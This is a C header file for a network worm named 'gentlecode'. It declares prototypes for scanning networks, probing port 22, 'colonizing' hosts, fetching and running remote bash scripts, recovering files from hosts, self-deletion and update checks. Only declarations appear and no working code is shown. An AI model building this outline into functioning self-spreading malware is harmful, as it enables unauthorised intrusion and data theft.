bool isRoot();
int isSourceHost();
void scanNetwork(char *fileToSend);
bool isAlreadyColonize(char* ip);
void colonize(char* ip, char* file);
bool isAuthorized(char *ip);
void wormDelete(char *ip);
void informationRecovery(const char *host_ip, const char *file_path, const char* file_out);


void getHostName(char* hostname, size_t size);
void fetchScriptHost(const char* host_ip, const char *remote_path, const char *local_path);
void executeScriptBash(const char *script_path);int check_port_22(const char *ip);
void createFlag(char *content);
void createUpdateFlag();
bool isUpdateAvailable(const char* host_ip);

#define IP_SIZE_MAX 15
#define HOST_NAME_SIZE 100
#define SIZE_COMMAND 100
#define RANDOM_NAME_SIZE 50

#define NAME_BASH "instruction.sh"
#define NAME_VIRUS "gentlecode"
#define NAME_DATA "datav"